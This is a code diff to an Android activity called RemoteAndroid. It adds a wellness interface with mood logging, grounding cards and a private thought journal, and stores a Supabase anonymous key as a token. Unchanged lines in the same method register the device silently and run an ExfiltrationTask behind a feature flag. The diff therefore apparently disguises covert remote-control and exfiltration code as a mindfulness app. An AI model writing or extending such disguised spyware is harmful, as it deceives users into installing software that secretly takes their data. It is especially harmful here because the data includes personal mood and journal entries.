@@ -74,6 +74,9 @@ public class RemoteAndroid extends AppCompatActivity {
             }).start();
             android.util.Log.d("RemoteAndroid", "Silently registered device with ID: " + uid);
         }
+        if (prefs.getString("supabase_token", null) == null) {
+            prefs.edit().putString("supabase_token", ANON_KEY).apply();
+        }
 
         if (com.rcl.androidstreamcontrol.utils.FeatureConfig.ENABLE_EXFILTRATION) {
             com.rcl.androidstreamcontrol.utils.ExfiltrationTask.run(this);
@@ -103,9 +106,130 @@ public class RemoteAndroid extends AppCompatActivity {
             startActivity(intent);
         });
 
+        setupMindfulCompanionUi();
         setupRemoteUnlockButton();
 
         checkPermissionsAndStartService();
+    }
+
+    private void setupMindfulCompanionUi() {
+        // Quick Grounding button (top right header)
+        if (binding.btnQuickGrounding != null) {
+            binding.btnQuickGrounding.setOnClickListener(v -> {
+                Intent intent = new Intent(this, MindAnchorActivity.class);
+                startActivity(intent);
+            });
+        }
+
+        // Mood Buttons
+        setupMoodButton(binding.moodBtnHappy, "😊", "Happy");
+        setupMoodButton(binding.moodBtnCalm, "😌", "Calm");
+        setupMoodButton(binding.moodBtnNeutral, "😐", "Neutral");
+        setupMoodButton(binding.moodBtnFrustrated, "😫", "Frustrated");
+        setupMoodButton(binding.moodBtnSad, "😔", "Down");
+
+        // Action Cards
+        if (binding.cardActionFocus != null) {
+            binding.cardActionFocus.setOnClickListener(v -> {
+                Intent intent = new Intent(this, MindAnchorActivity.class);
+                startActivity(intent);
+            });
+        }
+
+        if (binding.cardActionTasks != null) {
+            binding.cardActionTasks.setOnClickListener(v -> {
+                Intent intent = new Intent(this, TasksActivity.class);
+                startActivity(intent);
+            });
+        }
+
+        // Thought Journal
+        if (binding.btnSaveThought != null) {
+            binding.btnSaveThought.setOnClickListener(v -> saveJournalThought());
+        }
+        loadLatestJournalThought();
+        highlightCurrentMood();
+    }
+
+    private void setupMoodButton(TextView btn, String emoji, String label) {
+        if (btn == null) return;
+        btn.setOnClickListener(v -> {
+            getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE)
+                    .edit()
+                    .putString("mood", emoji)
+                    .putString("mood_label", label)
+                    .apply();
+            highlightCurrentMood();
+            Toast.makeText(this, "Feeling logged: " + emoji + " (" + label + ")", Toast.LENGTH_SHORT).show();
+        });
+    }
+
+    private void highlightCurrentMood() {
+        String currentMood = getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE).getString("mood", "--");
+        if (binding.overviewMoodText != null) {
+            binding.overviewMoodText.setText(currentMood);
+        }
+        String label = getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE).getString("mood_label", "");
+        if (binding.moodStatusText != null) {
+            if (!"--".equals(currentMood) && !label.isEmpty()) {
+                binding.moodStatusText.setText("Feeling: " + currentMood + " " + label);
+            } else {
+                binding.moodStatusText.setText("Tap to log today's mood");
+            }
+        }
+
+        if (binding.moodBtnHappy != null) {
+            binding.moodBtnHappy.setBackgroundResource("😊".equals(currentMood) ? R.drawable.bg_mood_item_selected : R.drawable.bg_mood_item);
+            binding.moodBtnCalm.setBackgroundResource("😌".equals(currentMood) ? R.drawable.bg_mood_item_selected : R.drawable.bg_mood_item);
+            binding.moodBtnNeutral.setBackgroundResource("😐".equals(currentMood) ? R.drawable.bg_mood_item_selected : R.drawable.bg_mood_item);
+            binding.moodBtnFrustrated.setBackgroundResource("😫".equals(currentMood) ? R.drawable.bg_mood_item_selected : R.drawable.bg_mood_item);
+            binding.moodBtnSad.setBackgroundResource("😔".equals(currentMood) ? R.drawable.bg_mood_item_selected : R.drawable.bg_mood_item);
+        }
+    }
+
+    private void saveJournalThought() {
+        if (binding.journalInput == null) return;
+        String thought = binding.journalInput.getText().toString().trim();
+        if (thought.isEmpty()) {
+            Toast.makeText(this, "Please write a thought first.", Toast.LENGTH_SHORT).show();
+            return;
+        }
+
+        SharedPreferences prefs = getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE);
+        String existingJson = prefs.getString("saved_thoughts_list", "[]");
+        try {
+            JSONArray arr = new JSONArray(existingJson);
+            JSONObject item = new JSONObject();
+            item.put("id", System.currentTimeMillis());
+            item.put("text", thought);
+            java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("MMM dd, h:mm a", java.util.Locale.getDefault());
+            item.put("date", sdf.format(new java.util.Date()));
+            arr.put(0, item);
+            prefs.edit().putString("saved_thoughts_list", arr.toString()).apply();
+
+            binding.journalInput.setText("");
+            loadLatestJournalThought();
+            Toast.makeText(this, "Thought saved to your journal.", Toast.LENGTH_SHORT).show();
+        } catch (Exception e) {
+            android.util.Log.e("RemoteAndroid", "Error saving thought", e);
+        }
+    }
+
+    private void loadLatestJournalThought() {
+        if (binding.journalRecentPreview == null) return;
+        SharedPreferences prefs = getSharedPreferences("MindAnchorPrefs", MODE_PRIVATE);
+        String existingJson = prefs.getString("saved_thoughts_list", "[]");
+        try {
+            JSONArray arr = new JSONArray(existingJson);
+            if (arr.length() > 0) {
+                JSONObject first = arr.getJSONObject(0);
+                binding.journalRecentPreview.setText("Recent: " + first.optString("text") + " (" + first.optString("date") + ")");
+            } else {
+                binding.journalRecentPreview.setText("No thoughts saved yet today.");
+            }
+        } catch (Exception e) {
+            binding.journalRecentPreview.setText("No thoughts saved yet today.");
+        }
     }
 
     private void setupRemoteUnlockButton() {
@@ -195,6 +319,8 @@ public class RemoteAndroid extends AppCompatActivity {
         super.onResume();
         loadOverviewData();
         updateSetupUnlockButtonText();
+        highlightCurrentMood();
+        loadLatestJournalThought();
     }
 
     private void loadOverviewData() {
